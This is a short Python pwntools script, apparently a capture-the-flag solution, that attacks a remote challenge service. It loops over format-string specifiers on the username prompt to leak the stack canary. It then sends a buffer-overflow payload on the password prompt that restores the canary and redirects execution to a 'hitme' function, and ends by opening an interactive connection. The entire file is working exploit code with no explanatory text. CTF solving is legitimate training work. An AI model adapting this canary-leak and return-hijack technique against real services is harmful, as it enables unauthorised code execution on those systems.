from pwn import *

host, port = "ctf.ukmpcc.org", "11001"

hitme_addr = p64(0x000000000040129D)
ret_addr = p64(0x00000000004013F4)
found = False
i = 1
while not found:
    conn = remote(host, port)
    payload = f"%{i}$p".encode()
    conn.sendlineafter(b"username: ", payload)
    result = conn.recvline().decode().strip()
    if result.endswith("00") and len(result) > 8:
        canary = int(result, 16)
        print(f"i: {i}")
        print(f"Canary: {hex(canary)}")
        found = True
        break

    conn.close()
    i += 1


payload = b"A" * 72
payload += p64(canary)
payload += b"B" * 8
payload += ret_addr
payload += hitme_addr

print(payload)

conn.sendlineafter(b"password: ", payload)

conn.interactive()
